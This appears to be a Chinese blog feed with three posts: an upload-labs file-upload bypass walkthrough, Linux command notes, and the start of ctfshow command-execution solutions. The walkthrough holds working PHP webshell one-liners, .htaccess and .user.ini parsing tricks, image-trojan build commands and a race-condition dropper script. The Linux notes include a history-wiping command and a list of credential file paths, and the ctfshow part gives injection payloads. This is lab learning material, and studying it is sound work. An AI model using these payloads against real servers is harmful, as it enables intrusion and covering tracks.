        <content type="html"><![CDATA[<h3 id="Pass01Javascript-前端检查"><a href="#Pass01Javascript-前端检查" class="headerlink" title="Pass01Javascript 前端检查"></a>Pass01Javascript 前端检查</h3><p>前端js限制，一般都是通过 JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过</p><p>1、禁用js</p><p>2、上传png后缀的webshell，代理抓包，修改上传的文件后缀 </p><p>​这里可能会遇到一个问题，burpsuite会抓不到包。这时我们只需把127.0.0.1改为本机IPv4的地址。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/154309.png" class=""><p>3、修改JS文件</p><p>右键—查看网站源代码—全部复制—创建一个记事本—将代码放进去—把记事本后缀名改为.html—用Notepad打开—找到js代码—删除</p><p>如果我们打开，是有上传文件的界面，但是不知道要上传给谁。这时我们返回到最开始，右键—检查—网络—然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/155607.png" class=""><p>然后我们在用Notepad打开我们自己的html文件，修改action,这个action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。最后用浏览器打开我们的html文件，上传。php文件即可。</p><h3 id="Pass02文件类型检查有缺陷"><a href="#Pass02文件类型检查有缺陷" class="headerlink" title="Pass02文件类型检查有缺陷"></a>Pass02文件类型检查有缺陷</h3><p>文件类型检查有缺陷（检查Content-Type标头是否与MIME 类型匹配）</p><p>上传php抓包，将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/164003.png" class=""><h3 id="Pass03黑名单限制不完全"><a href="#Pass03黑名单限制不完全" class="headerlink" title="Pass03黑名单限制不完全"></a>Pass03黑名单限制不完全</h3><p>对于黑名单限制上传文件后缀的 可以通过以下几种方式绕过</p><ol><li><p>通过使用可被执行但不常见的后缀名，比如 php5,shtml,phps,pht,phtml等等</p></li><li><p>上传恶意的配置文件（Apache .htaccess） 欺骗服务器将任意自定义文件扩展名映射到可知执行的MIME类型</p></li><li><p>利用后端解析差异绕过限制</p></li><li><ol><li>添加尾随字符，一些组件会去除或忽略尾随空格、点等：exploit.php. &#x2F;exploit.php+空格</li><li>对点，斜杠 使用URL 编码， 如果验证文件扩展名时没有解码，在服务端被解码，绕过黑名单限制， exploit%2Ephp</li><li>在文件扩展名前添加分号或 URL 编码的空字节字符。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C&#x2F;C++ 中的低级函数处理文件，例如，这可能会导致文件名结尾出现差异：exploit.asp;.jpg或exploit.asp%00.jpg</li></ol></li></ol><p>这一关上传.php5即可,可以用蚁剑连接，我用的是php5.4.45</p><h3 id="Pass04-htaccess-扩展后缀名"><a href="#Pass04-htaccess-扩展后缀名" class="headerlink" title="Pass04 .htaccess 扩展后缀名"></a>Pass04 .htaccess 扩展后缀名</h3><p>这一关限制了很多后缀，尝试上传 .htaccess 配置文件，将haha.png图片当作php代码进行解析</p><p>注意：在httpd.conf文件中设置 AllowOverried All ，才能使用.htaccess文件</p><p>首先创建一个.htaccess文件，里面写上代码</p><p>&lt;FilesMatch “haha.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>或：</p><p>&lt;FilesMatch “haha”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>然后再上传图片马即可</p><h3 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h3><p><strong>解法一：</strong></p><p>这一关的思路是它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php.  .说一下他的验证过程，首先他发现有一个点，这时会把他去掉，又发现有一个空格，也会把它去掉，我们这时还有一个点，也就是.php. 由于他只是验证一次，所以不会在去掉我们的点，这时就可以上传成功，也可以解析成功（系统会忽略最后一个点）。</p><p><strong>解法二：.user.ini</strong></p><p>首先上传.user.ini文件，文件内容为：<br> auto_prepend_file&#x3D;haha.png</p><p>user.ini文件里的意思是：所有的php文件都自动包含haha.png文件。.user.ini相当于一个用户自定义的php.ini</p><p>接着上传Pass05.png文件，文件内容为：<br> &lt;?php @eval($_POST[‘shell’]);?&gt;</p><p>最后需要访问的是readme.php</p><p>需要条件：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式（phpstudy切换版本，nts就是fastcgi模式）</li><li>上传目录下要有可执行的php文件</li></ul><p>.user.ini可以参考：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>解法三：</strong></p><p><strong>借助windows平台的正则匹配规则</strong></p><pre><code>如下符号在windows平台下等效果&quot; =&gt; .&gt; =&gt; ?&lt; =&gt; *</code></pre><p>首先随便上传一个xxx.php:.jpg，此时服务器会生成一个xxx.php的空文件，然后，修改数据包文件名为：<code>xxx.&lt;&lt;&lt;</code>，这里在move_uploaded_file($temp_file, ‘..&#x2F;..&#x2F;upload&#x2F;xxx.&lt;&lt;&lt;’)类似与正则匹配，匹配到…&#x2F;..&#x2F;upload&#x2F;xxx.php文件，然后会将此次上传的文件数据写入到xxx.php文件中，这样就成功写入我们的小马了</p><h3 id="Pass06大小写绕过"><a href="#Pass06大小写绕过" class="headerlink" title="Pass06大小写绕过"></a>Pass06大小写绕过</h3><p>服务器端检查后缀时忽略了对大小写的检测，故可以通过大小写混合后缀绕过</p><h3 id="Pass07黑名单限制不完全-空格"><a href="#Pass07黑名单限制不完全-空格" class="headerlink" title="Pass07黑名单限制不完全- 空格"></a>Pass07黑名单限制不完全- 空格</h3><p>这关没有首尾去空。上传php文件，抓包在后面加空格。</p><p>Windows下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点。</p><p>在Linux上面测试失败，Linux的机制很严格;在Windows上面测试成功！</p><h3 id="Pass08黑名单限制不完全-点"><a href="#Pass08黑名单限制不完全-点" class="headerlink" title="Pass08黑名单限制不完全 - 点"></a>Pass08黑名单限制不完全 - 点</h3><p>这一关黑名单，没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过</p><p>同样Linux测试失败。</p><h3 id="Pass09黑名单限制不完全-DATA"><a href="#Pass09黑名单限制不完全-DATA" class="headerlink" title="Pass09黑名单限制不完全 - ::$DATA"></a>Pass09黑名单限制不完全 - ::$DATA</h3><p>这一关黑名单，没有对::D A T A 进 行 处 理 ， 可 以 使 用 : : DATA进行处理，可以使用::DATA绕过黑名单(<strong>仅限windows</strong>)</p><p>上传PHP一句话文件，抓包改后缀haha.php::$DATA（注意访问的时候不要加上::$data）</p><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。</p><h3 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h3><p>第10关好像和第五关重复了，可以用第五关的方法绕过</p><h3 id="Pass11黑名单限制不完全-双写绕过"><a href="#Pass11黑名单限制不完全-双写绕过" class="headerlink" title="Pass11黑名单限制不完全 - 双写绕过"></a>Pass11黑名单限制不完全 - 双写绕过</h3><p>源码中 使用 str_ireplace 不区分大小写替换，只是替换了一次，我们可以利用双写绕过检查</p><p>上传文件名 ：webshell.pphphp</p><h3 id="Pass12-00截断-GETurl路径可控"><a href="#Pass12-00截断-GETurl路径可控" class="headerlink" title="Pass12-%00截断(GETurl路径可控)"></a>Pass12-%00截断(GETurl路径可控)</h3><p>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要php版本&lt;5.3.4，并且magic_quotes_gpc关闭。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/223357.png" class=""><p>url中的%00（只要是这种%xx）的形式，webserver会把它当作十六进制处理，然后把16进制的hex自动翻译成ascii码值“NULL”,实现了截断</p><h3 id="Pass13-00截断-POST路径可控"><a href="#Pass13-00截断-POST路径可控" class="headerlink" title="Pass13-00截断(POST路径可控)"></a>Pass13-00截断(POST路径可控)</h3><p>和12关区别就在于GET和POST,GET是可以把url自动解码的，但是POST不会</p><p>这里先写一个haha.php(空格)a，写空格是为了便于修改hex</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225738.png" class=""><p>因为post不会像get对%00进行自动解码，所以需要将%00修改为hex 00</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225950.png" class=""><h3 id="Pass14文件内容检测"><a href="#Pass14文件内容检测" class="headerlink" title="Pass14文件内容检测"></a>Pass14文件内容检测</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件</p><p>使用 图片马 + 文件包含 绕过</p><p><strong>制作图片马上传</strong></p><pre><code>Linux下：cat 1.png 1.php &gt; 2.pngWindows下：copy 1.png /b + 1.php /a 2.png</code></pre><pre><code>补充知识：1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。2.Jpg图片文件包括2字节：FF D8。3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。4.Bmp图片文件包括2字节：42 4D。即为 BM。</code></pre><p>我们这里直接可以在图片马开头加上GIF89a</p><p>上传图片马后点击‘文件包含漏洞’链接，然后在url里加上?file&#x3D;upload&#x2F;xxxxxxxx.gif即可</p><h3 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h3><p><strong>image_type_to_extension</strong> 根据指定的图像类型返回对应的后缀名</p><p>和14关的做法一致</p><h3 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h3><p><strong>exif_imagetype()</strong> 判断一个图像的类型,读取一个图像的第一个字节并检查其签名。</p><p>本函数可用来避免调用其它 exif函数用到了不支持的文件类型上或和 [$_SERVER’HTTP_ACCEPT’] 结合使用来检查浏览器是否可以显示某个指定的图像。需要开启 php_exif模块</p><p>和14关做法一致</p><h3 id="Pass17二次渲染绕过"><a href="#Pass17二次渲染绕过" class="headerlink" title="Pass17二次渲染绕过"></a>Pass17二次渲染绕过</h3><p><strong>imagecreatefromjpeg（）函数</strong> 二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。</p><p>imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p><p>所以二次渲染绕过就是把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分。</p><p>这里有个小提示，对于做文件上传之二次渲染建议用GIF图片，相对于简单一点。上传正常的GIF图片下载回显的图片，用编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片</p><p>可以参考 <a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><h3 id="Pass18条件竞争"><a href="#Pass18条件竞争" class="headerlink" title="Pass18条件竞争"></a>Pass18条件竞争</h3><p>第十八关主要是对条件竞争的考察，我们看代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。把木马php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的。</p><p>操作：首先，我们上传PHP文件，我们把木马换一下改为：</p><pre><code>&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code></pre><p>这样一旦访问到该文件就会在当前目录下生成一个<code>Tony.php</code>的一句话，就不必被删除了。</p><p>用BP拦截</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/192630.png" class=""><p>然后点击<code>Clear$</code>，接着设置无限发送空的<code>Payloads</code>，来让它一直上传该文件</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193036.png" class=""><p>可以把并发请求数设置高一点</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193626.png" class=""><p>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件</p><pre><code class="python">import requestsurl = &quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/haha.php&quot;while True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>接下来我们可以在BP点击开始攻击，同时我们也要运行python脚本，当出现OK说明访问到了该文件，那么Tony.php应该也创建成功了。</p><p>参考<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p><h3 id="Pass19"><a href="#Pass19" class="headerlink" title="Pass19"></a>Pass19</h3><p>第十九关的上传路径有点问题，不是上传到了upload里面，建议修改一下，进入第十九关，找到myupload.php文件，如图所示修改。改完后要重启靶场</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/201031.png" class=""><p>这关是先检查了后缀名，然后上传，然后在进行二次渲染。这时我们只能上传图片马，而且得配合apache解析漏洞或文件包含进行通关</p><p>这关和上一关操作差不多，不过得改一下python脚本：</p><p>import requests</p><pre><code>url = &quot;http://xxx.xxx.xxx.xxx/upload-labs/include.php/?file=./upload/haha.pngwhile True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>这里注意一下最后访问的URL为<a href="http://xxx.xxx.xxx.xxx/upload-labs/Tony.php">http://xxx.xxx.xxx.xxx/upload-labs/Tony.php</a></p><h3 id="Pass20-x2F-绕过"><a href="#Pass20-x2F-绕过" class="headerlink" title="Pass20 &#x2F;.绕过"></a>Pass20 &#x2F;.绕过</h3><p>move_uploaded_file()会忽略掉文件末尾的<code>/.</code></p><p><code>save_name</code> 可控，就可以直接将文件名写成haha.php&#x2F;.</p><p>也可以用%00截断绕过</p><h3 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h3><p>参考别人得wp：</p><pre><code>这一关白名单验证过程：--&gt; 验证上传路径是否存在--&gt; 验证[&#39;upload_file&#39;]的content-type是否合法（可以抓包修改）--&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）--&gt;判断file不是数组则使用explode(&#39;.&#39;, strtolower($file))对file进行切割，将file变为一个数组--&gt; 判断数组最后一个元素是否合法--&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name--&gt; 上传文件</code></pre><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210539.png" class=""><p>上传一句话png，burp抓包并改包：</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210652.png" class=""><pre><code>修改POST参数为数组类型，索引[0]为`haha.php`，索引[2]为`jpg|png|gif`。 只要第二个索引`不为1`，$file[count($file) - 1]就等价于$file[2-1]，值为空</code></pre><p>最后，服务端就成功存在了haha.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux学习</title>
      <link href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/14/linux%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、linux文件与目录结构"><a href="#一、linux文件与目录结构" class="headerlink" title="一、linux文件与目录结构"></a>一、linux文件与目录结构</h2><p>1.linux文件</p><p>​linux 系统中一切皆文件</p><p>2.linux 目录结构</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11230.jpg" class=""><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11231.png" class=""><h2 id="二、vi-x2F-vim编辑器"><a href="#二、vi-x2F-vim编辑器" class="headerlink" title="二、vi&#x2F;vim编辑器"></a>二、vi&#x2F;vim编辑器</h2><p>1、普通模式</p><p>2、编辑模式</p><p>3、命令模式</p><pre><code>命令  功能:w  保存:q  退出:wq  保存并退出:q!  不保存强制退出:set nu    显示行号:set nonu   关闭行号/要查找的词 n   查找下一个，N 往上查找:noh     取消高亮显示</code></pre><h2 id="三、常用基本命令"><a href="#三、常用基本命令" class="headerlink" title="三、常用基本命令"></a>三、常用基本命令</h2><h4 id="1、帮助命令"><a href="#1、帮助命令" class="headerlink" title="1、帮助命令"></a>1、帮助命令</h4><p>​man获得帮助信息</p><p>​help获得shell内置命令的帮助信息（系统加载启动后随着shell一起加载，常驻系统内存中，这部分命令被称为内置命令,使用type查看命令类型）</p><h4 id="2、文件目录类"><a href="#2、文件目录类" class="headerlink" title="2、文件目录类"></a>2、文件目录类</h4><p>（1）pwd 显示当前工作目录路径</p><p>（2）cd 切换路径</p><p>（3）ls 列出目录的内容</p><p>​-a全部的文件，连同隐藏档（开头为 . 的文件）一起列出来</p><p>​-l 长数据列出，包含文件的属性与权限等等数据，等同与”ll”</p><p>（4）mkdir 创建一个新的文件夹</p><p>（5）rmdir 删除一个空的文件夹</p><p>（6）touch 创建空文件</p><p>（7）cp 复制文件或目录</p><p>​cp  test.txt  ..&#x2F;home&#x2F;afdsf&#x2F;将test.txt复制到..&#x2F;home&#x2F;afdsf目录下</p><p>​cp  test.txt  ..&#x2F;home&#x2F;dsaf.txt将test.txt中的内容覆盖到dsaf.txt</p><p>​cp  -r  a  &#x2F;home&#x2F;afdsf&#x2F;将a目录复制到afdsf目录下</p><p>（8）rm 删除文件或目录</p><p>​-r递归删除目录中的所有内容</p><p>​-f强制执行删除操作。而不是提示进行确认</p><p>（9）mv 移动文件与目录或重命名</p><p>​mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;  移动文件</p><p>​mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;1.txt  将inital.txt移动并且重命名为1.txt</p><p>（10）cat 查看文件内容</p><p>​-n显示所有行的行号，包括空行</p><p>（11）more 文件内容分屏查看器</p><p>（12）less  分屏显示文件内容（比more更强大）</p><p>（13）echo 输出内容到控制台</p><p>​-e支持反斜线控制的字符转换</p><p>（14）&gt; 输出重定向和 &gt;&gt; 追加</p><p>​ls -l &gt; a.txt（列表的内容写入文件a.txt中（覆盖写））</p><p>​ls -ll &gt;&gt; a.txt （列表的内容追加到文件a.txt的末尾）</p><p>​cat 文件1 &gt; 文件2（将文件1的内容覆盖到文件2）</p><p>（15）head 显示文件头部内容</p><p>​head用于显示文件开头部分内容，默认情况下head指令显示文件的前10行内容</p><p>​-n&lt;行数&gt; 指定显示头部内容的行数</p><p>（16）tail 输出文件尾部内容</p><p>​tail -n 5 文件查看文件尾部5行内容</p><p>​tail -f 文件实时追踪该文档的所有更新</p><p>（17）ln 软链接软链接也称为符号链接，类似于windows里的快捷方式，主要存放了链接其他文件的路径</p><p>（18）history 查看历史命令</p><p>​清空历史命令:</p><p>​bash: history -c</p><p>​zsh: rm -rf &#x2F;root&#x2F;.zsh_history（<em>kali</em> 默认的 shell <em>环境</em>已经从 bash 更改为 zsh）<strong>执行完之后要重新登录才能生效</strong></p><h4 id="3、时间日期类"><a href="#3、时间日期类" class="headerlink" title="3、时间日期类"></a>3、时间日期类</h4><p>​date 查看当天日期</p><p>​cal 查看日历</p><h4 id="4、用户管理命令"><a href="#4、用户管理命令" class="headerlink" title="4、用户管理命令"></a>4、用户管理命令</h4><p>​（1）useradd 添加新用户</p><p>​useradd 用户名（添加新用户）</p><p>​useradd  -g  组名  用户名（添加新用户到某个组）</p><p>​（2）passwd 设置用户密码</p><p>​password 用户名</p><p>​（3）id 查看用户是否存在</p><p>​（4）cat  &#x2F;etc&#x2F;password  查看系统中的用户信息</p><p>​（5）su 切换用户</p><p>​（6）who 查看登录用户信息</p><p>​whoami  查看当前登录用户信息</p><p>​who am i  查看原始登录用户（有空格）</p><p>​（7）</p><h4 id="5、端口命令"><a href="#5、端口命令" class="headerlink" title="5、端口命令"></a>5、端口命令</h4><pre><code>netstat -tunlp | grep 端口号</code></pre><p>-tunlp的含义：</p><ul><li>-t (tcp) 仅显示tcp相关选项</li><li>-u (udp)仅显示udp相关选项</li><li>-n 拒绝显示别名，能显示数字的全部转化为数字</li><li>-l 仅列出在Listen(监听)的服务状态</li><li>-p 显示建立相关链接的程序名</li></ul><p>比如查看22端口的情况</p><p>​netstat -tunlp |grep 22</p><p>杀死端口</p><pre><code>kill -9 PID</code></pre><p>例如杀死PID为2956的端口：</p><p>kill -9 2956</p><h4 id="6、查找命令"><a href="#6、查找命令" class="headerlink" title="6、查找命令"></a>6、查找命令</h4><h5 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h5><pre><code>find &lt; path &gt; &lt; expression &gt; &lt; cmd &gt;&#39;&#39;&#39;path： 所要搜索的目录及其所有子目录。默认为当前目录。expression： 所要搜索的文件的特征。cmd： 对搜索结果进行特定的处理。如果什么参数也不加，find默认搜索当前目录及其子目录，并且不过滤任何结果（也就是返回所有文件），将它们全都显示在屏幕上。&#39;&#39;&#39;</code></pre><p>例：</p><p>-name 按照文件名查找文件。</p><pre><code># 在/dir目录及其子目录下面查找名字为filename的文件find /dir -name filename # 在当前目录及其子目录（用“.”表示）中查找任何扩展名为“c”的文件find . -name &quot;*.c&quot; </code></pre><h4 id="7、配置全局网络代理"><a href="#7、配置全局网络代理" class="headerlink" title="7、配置全局网络代理"></a>7、配置全局网络代理</h4><p>以下都需要在clash全局模式(global)下</p><p>（1）虚拟机使用net网络模式</p><p>​直接在主机clash上开启TUN模式和混合配置(mixin)（防止冲突关闭systemproxy系统代理）</p><p>{ % asset_img 232556%}</p><p>按照上面三步依次执行，最后点开mixin选项，编辑文件，删除里面的内容，粘贴上下面的内容即可！</p><pre><code>mixin:   hosts:     &#39;mtalk.google.com&#39;: 108.177.125.188     &#39;services.googleapis.cn&#39;: 74.125.203.94     &#39;raw.githubusercontent.com&#39;: 151.101.76.133   dns:     enable: true     default-nameserver:       - 223.5.5.5   # 阿里的DNS服务器       - 1.0.0.1     # CloudFlare的DNS服务器     ipv6: false     enhanced-mode: redir-host #fake-ip     nameserver:       - https://dns.rubyfish.cn/dns-query       - https://223.5.5.5/dns-query       - https://dns.pub/dns-query     fallback:       - https://1.0.0.1/dns-query       - https://public.dns.iij.jp/dns-query       - https://dns.twnic.tw/dns-query     fallback-filter:       geoip: true       ipcidr:         - 240.0.0.0/4         - 0.0.0.0/32         - 127.0.0.1/32       domain:         - +.google.com         - +.facebook.com         - +.twitter.com         - +.youtube.com         - +.xn--ngstr-lra8j.com         - +.google.cn         - +.googleapis.cn         - +.gvt1.com   tun:     enable: true     stack: gvisor     dns-hijack:       - 198.18.0.2:53     macOS-auto-route: true     macOS-auto-detect-interface: true # 自动检测出口网卡</code></pre><p>（2）虚拟机使用桥接模式</p><p>​&lt;1&gt;clash开启系统代理(systemproxy)</p><p>​ &lt;2&gt;linux进入&#x2F;etc&#x2F;profile.d目录，新建proxy.sh，内容如下：</p><pre><code>export proxy=&quot;http://192.168.150.1:7890&quot;export http_proxy=$proxyexport https_proxy=$proxyexport HTTP_PROXY=$proxyexport HTTPS_PROXY=$proxyexport all_proxy=socks5://192.168.10.103:7890</code></pre><p>​&lt;3&gt;执行脚本文件</p><pre><code>sourch proxy.sh</code></pre><p>​&lt;4&gt;配置github网络代理</p><pre><code>git config --global http.https://github.com.proxy socks5://192.168.150.1:7890</code></pre><p>​&lt;5&gt;检查代理</p><pre><code>curl cip.cc</code></pre><p>​&lt;6&gt;浏览器代理需要单独配置，chrome可以用代理插件</p><h1 id="Linux配置文件路径大全"><a href="#Linux配置文件路径大全" class="headerlink" title="Linux配置文件路径大全"></a>Linux配置文件路径大全</h1><pre><code>1:/etc/sysconfig/i18n(语言配置文件).2:/etc/sysconfig/network-scripts/ifcfg-eth0(eth0配置文件).3:/boot/grub/grub.conf(grup配置文件) 或/boot/grub/menu.list.4:/etc/passwd:系统用户数据库文件.5:/etc/group:组的数据库文件.6:/etc/gshadow(存放密码).7:/etc/shadow(存放密码).8:/etc/profile(系统环境).9:/etc/bashrc(系统变量).10:/etc/shells(存放shell).11:/etc/sudoers(sudo配置文件).12:/etc/inittab(设置启动级别).13:/etc/rc.d/rc.local系统启动是执行的文件类似于windows的autoexec.bat).14HOME/Xclients(控制启动x客户端).15:/etc/X11/Xinit/xinitrc.d/xinput(启动x-windows的加载程序配置文件).16:/etc/fstab(文件系统格式表).17:/var/log/(存放日志目录).18:/var/spool/at/(存放at时间任务的目录).19:/etc/at.deny(禁止时间任务,针对用户).20:/etc/at.allow( 允许时间任务,针对用户).21:/etc/crontab(crontab配置文件).22:/etc/anacrontab(anacrontab配置文件).23:/etc/moudle.conf(网卡,声卡,usb的模块).24:/etc/protocols(协议).25:/etc/services(端口).26:/etc/dhcpd.conf(DHCP配置文件,默任不存在).27:/var/lib/dhcp/dhcpd.leases(查看哪个用户,使用你的dhcp服务器).29:/etc/hosts 或者 /etc/sysconfig/network(修改主机名).30:/etc/named.conf(DNS主配置文件).31:/etc/host.conf(解晰主机时用host表还是dns).32:/etc/resolv.conf(指定dns服务器ip).33:/etc/httpd/conf/httpd.conf(apache配置文件)34:/etc/mail/(sendmail目录).35:/etc/aliases(别名配置文件).36:/etc/samba/smb.conf(smb配置文件).37:/etc/proftpd.conf(ftp配置文件).38:/etc/squid/squid.conf(squid配置文件).39:/etc/pam.d/su(限制用户使用su).40:/etc/secruetty(限制根用户直接登陆终端).41:/etc/secrrity/access.conf(限制某用户登陆).42:/etc/nologin(限制所有用户登陆).43:/etc/sudoers(强制用户每次使用sudo输入密码).44:/etc/security/time.conf(限制用户登陆系统时间).45:/etc/hosts.allow46:/etc/hosts.deny47:/etc/issue(登陆提示)48:/etc/issue.net(远程登陆提示).49:/etc/motd(输入用户名和密码后看到的内容).50:/etc/login.defs(生成新用户,基本参数).51:/etc/logrotate.conf(日志文件各级的选项).52:/proc/sys/net/ipv4/ip_forward(即使路由功能打开).53:/etc/sysctl.conf(永久打开路由功能).54:/proc/sys/net/ipv4/icmp_echo_igore_all(是否允许ping).55:/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts(广播ping)56:/proc/self/cmdline(获取当前执行系统命令)57:/proc/net/arp(查看内网存活主机)58:/etc/hosts(同上)59:/proc/net/tcp60:/proc/net/udp61:/proc/net/dev62:/proc/net/fib_trie63:/proc/self/environ64:/sys/class/net/eth0/address(获得网卡mac地址）</code></pre><h1 id="Nginx-重要文件目录"><a href="#Nginx-重要文件目录" class="headerlink" title="Nginx 重要文件目录"></a>Nginx 重要文件目录</h1><pre><code>配置文件存放目录：/etc/nginx主要配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules</code></pre><h1 id="linux下的快捷键"><a href="#linux下的快捷键" class="headerlink" title="linux下的快捷键"></a>linux下的快捷键</h1><pre><code>ctrl+c强行中断当前程序的执行。ctrl+z将任务中断,但是此任务并没有结束,他仍然在进程中，只是放到后台并维持挂起的状态。如需其在后台继续运行，需用“bg 进程号”使其继续运行；再用&quot;fg 进程号&quot;可将后台进程前台化。ctrl+\表示退出。ctrl+d表示结束当前输入（即用户不再给当前程序发出指令），那么Linux通常将结束当前程序。(ctrl-d 不是发送信号，而是表示一个特殊的二进制值，表示 EOF。)(在shell中，ctrl-d表示退出当前shell.)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行(ctfshow)</title>
      <link href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"/>
      <url>/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="类型一-变量c来接受并过滤传入的数据-eval函数来执行"><a href="#类型一-变量c来接受并过滤传入的数据-eval函数来执行" class="headerlink" title="类型一:变量c来接受并过滤传入的数据,eval函数来执行"></a>类型一:变量c来接受并过滤传入的数据,eval函数来执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>使用通配符*或?或’’等等绕过flag</p><pre><code>payload 1.c=system(&quot;cat f*&quot;);2.c=echo `cat f*`;3.c=echo `nl fl&#39;&#39;ag.php`;或c=echo `nl fl&quot;&quot;ag.php`;//nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号4.c=echo `nl fl\ag.php`;   //转义字符绕过5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //通过变量赋值直接绕过c的过滤?ip=127.0.0.1;cat `ls` 